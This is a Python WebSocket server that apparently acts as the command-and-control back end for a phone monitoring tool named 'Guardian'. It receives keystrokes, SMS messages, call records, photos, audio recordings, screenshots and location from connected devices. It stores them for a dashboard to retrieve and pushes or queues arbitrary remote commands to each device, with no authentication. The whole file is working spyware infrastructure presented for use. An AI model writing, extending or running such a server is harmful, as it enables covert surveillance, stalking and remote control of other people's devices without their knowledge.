import asyncio
import json
import websockets
from datetime import datetime

# Store connected devices
connected_devices = {}  # device_id -> websocket
pending_commands = {}   # device_id -> [commands]
captured_data = {}      # device_id -> [data]

async def handle_connection(websocket, path):
    """Handle a Guardian device connection"""
    device_id = None
    
    try:
        # Wait for registration message
        msg = await websocket.recv()
        data = json.loads(msg)
        
        if data.get("type") == "register":
            device_id = data.get("device_id")
            user_id = data.get("user_id")
            
            connected_devices[device_id] = {
                "ws": websocket,
                "user_id": user_id,
                "connected_at": datetime.utcnow().isoformat(),
                "device_info": data.get("device_info", {})
            }
            
            print(f"✅ Device connected: {device_id}")
            
            # Send any pending commands
            if device_id in pending_commands and pending_commands[device_id]:
                await websocket.send(json.dumps({
                    "type": "commands",
                    "commands": pending_commands[device_id]
                }))
                pending_commands[device_id] = []
            
            # Listen for data from device
            async for message in websocket:
                try:
                    msg_data = json.loads(message)
                    msg_type = msg_data.get("type")
                    
                    if msg_type == "keystroke":
                        store_data(device_id, "keystroke", msg_data)
                    elif msg_type == "sms":
                        store_data(device_id, "sms", msg_data)
                    elif msg_type == "call":
                        store_data(device_id, "call", msg_data)
                    elif msg_type == "photo":
                        store_data(device_id, "photo", msg_data)
                    elif msg_type == "audio":
                        store_data(device_id, "audio", msg_data)
                    elif msg_type == "screenshot":
                        store_data(device_id, "screenshot", msg_data)
                    elif msg_type == "command_result":
                        store_data(device_id, "command_result", msg_data)
                    elif msg_type == "heartbeat":
                        # Update device status
                        if device_id in connected_devices:
                            connected_devices[device_id]["last_heartbeat"] = datetime.utcnow().isoformat()
                            connected_devices[device_id]["battery"] = msg_data.get("battery")
                            connected_devices[device_id]["location"] = msg_data.get("location")
                        
                except Exception as e:
                    print(f"Error processing message: {e}")
                    
    except websockets.exceptions.ConnectionClosed:
        print(f"🔴 Device disconnected: {device_id}")
    finally:
        if device_id and device_id in connected_devices:
            del connected_devices[device_id]


def store_data(device_id, data_type, data):
    """Store captured data for retrieval"""
    if device_id not in captured_data:
        captured_data[device_id] = []
    
    captured_data[device_id].append({
        "type": data_type,
        "data": data,
        "timestamp": datetime.utcnow().isoformat()
    })
    
    # Keep only last 1000 entries per device
    if len(captured_data[device_id]) > 1000:
        captured_data[device_id] = captured_data[device_id][-1000:]


async def send_command_to_device(device_id, command):
    """Send a command to a connected device"""
    if device_id in connected_devices:
        ws = connected_devices[device_id]["ws"]
        await ws.send(json.dumps({
            "type": "command",
            "command": command
        }))
        return True
    else:
        # Queue command for when device connects
        if device_id not in pending_commands:
            pending_commands[device_id] = []
        pending_commands[device_id].append(command)
        return False


# HTTP endpoint to send commands (called from dashboard)
async def handle_http_request(method, path, body=None):
    """Handle HTTP requests from dashboard"""
    
    if path == "/ws/devices" and method == "GET":
        # List connected devices
        devices = []
        for device_id, info in connected_devices.items():
            devices.append({
                "device_id": device_id,
                "user_id": info["user_id"],
                "connected_at": info.get("connected_at"),
                "battery": info.get("battery"),
                "location": info.get("location"),
                "last_heartbeat": info.get("last_heartbeat")
            })
        return {"status": "ok", "devices": devices}
    
    elif path == "/ws/data" and method == "GET":
        # Get captured data
        device_id = body.get("device_id") if body else None
        data_type = body.get("data_type") if body else "all"
        
        if device_id and device_id in captured_data:
            data = captured_data[device_id]
            if data_type != "all":
                data = [d for d in data if d["type"] == data_type]
            return {"status": "ok", "data": data[-100:]}  # Last 100 items
        return {"status": "ok", "data": []}
    
    elif path == "/ws/command" and method == "POST":
        # Send command to device
        device_id = body.get("device_id")
        command = body.get("command")
        
        if device_id and command:
            success = await send_command_to_device(device_id, command)
            return {"status": "ok" if success else "queued", "sent": success}
        
        return {"status": "error", "message": "Missing device_id or command"}
    
    return {"status": "error", "message": "Unknown endpoint"}


async def main():
    print("🚀 WebSocket Server starting on port 8765...")
    async with websockets.serve(handle_connection, "0.0.0.0", 8765):
        print("✅ WebSocket Server running on ws://0.0.0.0:8765")
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    asyncio.run(main())
